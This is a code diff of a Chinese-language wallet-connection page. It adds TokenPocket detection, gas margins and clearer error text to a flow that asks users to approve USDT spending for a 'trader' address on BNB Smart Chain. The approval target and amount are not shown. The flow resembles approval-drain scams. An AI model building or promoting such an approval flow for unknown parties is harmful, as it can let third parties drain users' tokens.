@@ -38,7 +38,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
 .btn-bg{background:#238636;color:#fff}
 .btn-blue{background:#1f6feb;color:#fff}
 .btn:disabled{opacity:.5;cursor:not-allowed}
-.msg{margin-top:14px;padding:12px;border-radius:8px;font-size:.9em;display:none}
+.msg{margin-top:14px;padding:12px;border-radius:8px;font-size:.9em;display:none;overflow:hidden}
 .msg.ok{display:block;background:#0d2818;color:#3fb950;border:1px solid #238636}
 .msg.err{display:block;background:#2d1117;color:#f85149;border:1px solid #da3633}
 .msg.info{display:block;background:#0d1117;color:#58a6ff;border:1px solid #1f6feb}
@@ -60,10 +60,10 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
         <div class="desc">狐狸钱包浏览器插件</div>
         <div class="check">✓</div>
       </div>
-      <div class="wallet-card" id="cardTP" onclick="selectWallet('tp')">
+      <div class="wallet-card" id="cardTokenPocket" onclick="selectWallet('tokenpocket')">
         <div class="icon icon-tp">🔵</div>
-        <div class="name">TP Wallet</div>
-        <div class="desc">TP钱包 App / 插件</div>
+        <div class="name">TokenPocket</div>
+        <div class="desc">TokenPocket 钱包 App</div>
         <div class="check">✓</div>
       </div>
     </div>
@@ -104,7 +104,7 @@ var traderAddress = '';
 var usdtAddress = '';
 var walletAddr = '';
 var connected = false;
-var selectedWallet = ''; // 'metamask' | 'tp'
+var selectedWallet = ''; // 'metamask' | 'tokenpocket'
 var provider = null;    // EIP-1193 provider
 
 function showMsg(text, type) {
@@ -124,7 +124,7 @@ function selectWallet(type) {
 
   // 更新选中样式
   document.getElementById('cardMetaMask').classList.toggle('active', type === 'metamask');
-  document.getElementById('cardTP').classList.toggle('active', type === 'tp');
+  document.getElementById('cardTokenPocket').classList.toggle('active', type === 'tokenpocket');
 
   // 更新按钮和步骤文字
   var connectBtn = document.getElementById('connectBtn');
@@ -136,9 +136,9 @@ function selectWallet(type) {
     document.getElementById('step1Title').textContent = '连接 MetaMask 钱包';
     document.getElementById('step2Desc').textContent = '点击下方按钮，在 MetaMask 中确认授权交易';
   } else {
-    connectBtn.textContent = '连接 TP Wallet';
-    document.getElementById('step1Title').textContent = '连接 TP Wallet';
-    document.getElementById('step2Desc').textContent = '点击下方按钮，在 TP 钱包中确认授权交易';
+    connectBtn.textContent = '连接 TokenPocket';
+    document.getElementById('step1Title').textContent = '连接 TokenPocket';
+    document.getElementById('step2Desc').textContent = '点击下方按钮，在 TokenPocket 中确认授权交易';
   }
 
   // 隐藏消息
@@ -147,7 +147,7 @@ function selectWallet(type) {
 
 // ═══ 获取 EIP-1193 provider ═══
 // MetaMask 注入 window.ethereum
-// TP Wallet 注入 window.ethereum 或 window.tp
+// TokenPocket 注入 window.ethereum / window.tokenpocket
 function getProvider() {
   if (selectedWallet === 'metamask') {
     // MetaMask
@@ -161,17 +161,25 @@ function getProvider() {
     return null;
   }
 
-  if (selectedWallet === 'tp') {
-    // TP Wallet — 多种注入方式
-    // 1. window.ethereum (TP Wallet 浏览器内置 / TP Wallet 插件)
+  if (selectedWallet === 'tokenpocket') {
+    // TokenPocket — 多种注入方式
+    // 1. window.ethereum.isTokenPocket (TokenPocket 新版)
+    if (window.ethereum && window.ethereum.isTokenPocket) {
+      return window.ethereum;
+    }
+    // 2. window.ethereum.isTp (TokenPocket 旧版标识)
     if (window.ethereum && window.ethereum.isTp) {
       return window.ethereum;
     }
-    // 2. window.tp (TP Wallet 旧版注入)
+    // 3. window.tokenpocket (TokenPocket SDK 注入)
+    if (window.tokenpocket && typeof window.tokenpocket.request === 'function') {
+      return window.tokenpocket;
+    }
+    // 4. window.tp (TokenPocket 旧版 SDK)
     if (window.tp && typeof window.tp.request === 'function') {
       return window.tp;
     }
-    // 3. window.ethereum (通用 EIP-1193 — TP Wallet 移动端 DApp 浏览器)
+    // 5. window.ethereum (通用 EIP-1193 — TokenPocket 移动端 DApp 浏览器)
     if (window.ethereum) {
       return window.ethereum;
     }
@@ -218,13 +226,12 @@ async function connectWallet() {
   provider = getProvider();
 
   if (!provider) {
-    var walletName = selectedWallet === 'metamask' ? 'MetaMask' : 'TP Wallet';
     var msgEl = document.getElementById('msg');
     msgEl.className = 'msg err';
-    if (selectedWallet === 'tp') {
-      msgEl.innerHTML = '未检测到 TP 钱包<br><br>请在 TP 钱包 App 中打开此页面：<br>1. 打开 TP 钱包 App<br>2. 点击底部「发现」<br>3. 在搜索框粘贴当前网址<br>4. 打开后点击「去授权」<br><br><a href="https://tokenpocket.pro/" target="_blank" style="color:#58a6ff;text-decoration:underline">下载 TP 钱包</a> &nbsp;或选择 <b>MetaMask</b> 授权';
+    if (selectedWallet === 'tokenpocket') {
+      msgEl.innerHTML = '未检测到 TokenPocket 钱包<br><br>请在 TokenPocket App 中打开此页面：<br>1. 打开 TokenPocket App<br>2. 点击底部「发现」<br>3. 在搜索框粘贴当前网址<br>4. 打开后点击「去授权」<br><br><a href="https://tokenpocket.pro/" target="_blank" style="color:#58a6ff;text-decoration:underline">下载 TokenPocket</a> &nbsp;或选择 <b>MetaMask</b> 授权';
     } else {
-      msgEl.innerHTML = '未检测到 MetaMask<br><br>请安装 MetaMask 浏览器插件后刷新页面<br><br><a href="https://metamask.io/download/" target="_blank" style="color:#58a6ff;text-decoration:underline">下载 MetaMask</a> &nbsp;或选择 <b>TP 钱包</b> 授权';
+      msgEl.innerHTML = '未检测到 MetaMask<br><br>请安装 MetaMask 浏览器插件后刷新页面<br><br><a href="https://metamask.io/download/" target="_blank" style="color:#58a6ff;text-decoration:underline">下载 MetaMask</a> &nbsp;或选择 <b>TokenPocket</b> 授权';
     }
     msgEl.style.display = 'block';
     setStep(1, 'err');
@@ -246,7 +253,7 @@ async function connectWallet() {
     // 检查是否在 BSC 网络
     var chainId = await provider.request({ method: 'eth_chainId' });
     if (chainId !== '0x38') {
-      var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TP 钱包';
+      var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TokenPocket';
       showMsg('请在 ' + walletLabel + ' 中切换到 BSC 网络', 'info');
       try {
         await provider.request({
@@ -307,18 +314,21 @@ async function approveUSDT() {
       data: data,
     };
 
-    // 估算 gas
+    // 估算 gas — 给 50% 余量
     try {
       var gasEstimate = await provider.request({
         method: 'eth_estimateGas',
         params: [txParams]
       });
-      txParams.gas = gasEstimate;
+      // 增加 50% 余量防止 gas 不足导致交易失败
+      var gasNum = parseInt(gasEstimate, 16);
+      var gasWithMargin = Math.ceil(gasNum * 1.5);
+      txParams.gas = '0x' + gasWithMargin.toString(16);
     } catch (ge) {
-      txParams.gas = '0x' + (100000).toString(16);
+      txParams.gas = '0x' + (150000).toString(16);
     }
 
-    var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TP 钱包';
+    var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TokenPocket';
     showMsg('请在 ' + walletLabel + ' 中确认授权交易...', 'info');
 
     var txHash = await provider.request({
@@ -347,7 +357,7 @@ async function approveUSDT() {
     }
 
     if (receipt.status === '0x0' || receipt.status === 0) {
-      showMsg('交易失败，请查看 BSCScan: https://bscscan.com/tx/' + txHash, 'err');
+      showMsg('交易失败，可能原因：\n1. 钱包 BNB 不足支付 gas 费\n2. 网络拥堵\n\n请查看: https://bscscan.com/tx/' + txHash, 'err');
       setStep(2, 'err');
       document.getElementById('approveBtn').disabled = false;
       return;
